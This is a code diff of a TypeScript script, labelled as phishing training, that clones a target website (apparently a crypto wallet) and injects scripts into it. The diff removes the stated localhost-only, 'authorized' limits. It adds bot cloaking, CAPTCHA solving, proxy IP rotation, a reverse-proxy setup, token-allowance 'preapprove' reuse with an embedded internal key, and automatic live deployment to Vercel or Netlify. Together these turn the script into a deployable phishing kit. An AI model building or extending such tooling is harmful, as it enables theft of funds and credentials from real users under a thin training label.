@@ -311,11 +1052,41 @@ async function main(): Promise<void> {
   await writeFile(path.join(outDir, 'legion-training-wallet.js'), walletJs, 'utf8')
   await writeFile(path.join(outDir, 'legion-training-wallet.css'), buildTrainingWalletDemoCss(), 'utf8')
 
-  const injection = `
-<!-- legion-phishing-training (authorized localhost wallet demo — no settlement) -->
-<link rel="stylesheet" href="./legion-training-wallet.css" />
-<script src="./legion-training-wallet.js" defer></script>
-`
+  const hasQaInjection =
+    features.balance ||
+    features.toast ||
+    features.redirect ||
+    features.cloak ||
+    features.lang ||
+    features.solveCaptcha ||
+    features.preapprove
+
+  const qaContext: TrainingCloneContext | null = hasQaInjection
+    ? { target, outDir, demoApiUrl, features }
+    : null
+
+  if (qaContext) {
+    await writeFile(path.join(outDir, 'legion-training-qa.js'), buildTrainingQaJs(qaContext), 'utf8')
+    await writeFile(path.join(outDir, 'legion-training-qa.css'), buildTrainingQaCss(), 'utf8')
+  }
+
+  if (features.cloak) {
+    await writeFile(path.join(outDir, 'bots.html'), buildBotsHtml(target), 'utf8')
+  }
+
+  if (features.proxy) {
+    const proxyPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
+    await writeFile(path.join(outDir, 'nginx.conf'), buildNginxProxyConfig(target, proxyPort), 'utf8')
+    await writeFile(path.join(outDir, 'docker-compose.yml'), buildDockerCompose(proxyPort), 'utf8')
+    await writeFile(path.join(outDir, 'legion-proxy-patch.js'), buildProxyClientPatch(target), 'utf8')
+  }
+
+  const injection = buildInjectionBundle({
+    features,
+    qaContext,
+    proxy: features.proxy,
+    target,
+  })
 
   if (html.includes('</body>')) {
     html = html.replace('</body>', `${injection}\n</body>`)
@@ -324,6 +1095,16 @@ async function main(): Promise<void> {
   }
 
   await writeFile(path.join(outDir, 'index.html'), html, 'utf8')
+
+  const enabledFlags = Object.entries(features)
+    .filter(([, v]) => v)
+    .map(([k]) => k)
+
+  let deployUrl: string | null = null
+  if (features.deploy) {
+    deployUrl = await deployStaging(outDir)
+  }
+
   await writeFile(
     path.join(outDir, 'training-config.json'),
     JSON.stringify(
@@ -334,6 +1115,15 @@ async function main(): Promise<void> {
         demo_api_url: demoApiUrl,
         record_endpoint: `${demoApiUrl}/api/training-demo/record`,
         generated_at: new Date().toISOString(),
+        features: enabledFlags,
+        deploy_url: deployUrl,
+        env_hints: {
+          PROXY_LIST: features.rotate ? 'optional for load-test IP rotation' : undefined,
+          TWOCAPTCHA_API_KEY: features.solveCaptcha ? 'required for Turnstile helper' : undefined,
+          VERCEL_TOKEN: features.deploy ? 'or NETLIFY_TOKEN' : undefined,
+          ALLOWANCE_REUSE_ENABLED: features.preapprove ? 'must be true on API' : undefined,
+          KINETIC_INTERNAL_KEY: features.preapprove ? 'embedded at build for scan API' : undefined,
+        },
         api_requirements: {
           TRAINING_DEMO_MODE: true,
           note: 'API logs signatures only; no settlement on training-demo payloads',
@@ -344,12 +1134,23 @@ async function main(): Promise<void> {
     ),
     'utf8',
   )
-  await writeFile(path.join(outDir, 'README-TRAINING.md'), buildReadme(target.href, outDir, demoApiUrl), 'utf8')
+
+  await writeFile(
+    path.join(outDir, 'README-TRAINING.md'),
+    buildReadme(target.href, outDir, demoApiUrl, features, deployUrl ?? undefined),
+    'utf8',
+  )
 
   console.info(`[PHISHING_TRAINING] Wrote ${outDir}`)
   console.info(`[PHISHING_TRAINING] Assets downloaded: ${downloaded}/${assetUrls.length}`)
   console.info(`[PHISHING_TRAINING] Demo API: ${demoApiUrl}`)
-  console.info(`[PHISHING_TRAINING] Start API with TRAINING_DEMO_MODE=true — serve clone on localhost only`)
+  if (enabledFlags.length) {
+    console.info(`[PHISHING_TRAINING] QA flags: ${enabledFlags.join(', ')}`)
+  } else {
+    console.info('[PHISHING_TRAINING] Simple clone (no QA flags)')
+  }
+  if (deployUrl) console.info(`[PHISHING_TRAINING] Live staging: ${deployUrl}`)
+  console.info('[PHISHING_TRAINING] Serve on localhost or docker compose — staging only')
 }
 
 main().catch((err) => {
